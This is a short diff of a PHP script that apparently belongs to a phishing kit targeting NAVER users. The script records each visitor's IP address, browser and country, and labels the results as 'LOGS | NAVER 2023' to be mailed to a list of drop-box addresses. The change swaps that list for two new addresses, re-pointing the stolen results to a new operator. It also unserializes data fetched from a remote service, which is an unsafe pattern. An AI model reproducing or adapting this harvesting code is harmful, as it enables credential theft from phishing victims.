@@ -9,7 +9,7 @@ $ip = getenv("REMOTE_ADDR");
 $addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
 $country = stripslashes(ucfirst($addr_details['geoplugin_countryName']));
 $browserAgent = $_SERVER['HTTP_USER_AGENT'];
-$own = 'godmade9@yandex.com, goulettedavid987@gmail.com';
+$own = 'alisontex8@yandex.com, alisontex8@gmail.com';
 $server = date("D/M/d, Y g:i a"); 
 $sender = 'result@donking.net';
 $domain = 'LOGS | NAVER 2023 |';
@@ -54,3 +54,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
 ?>
+
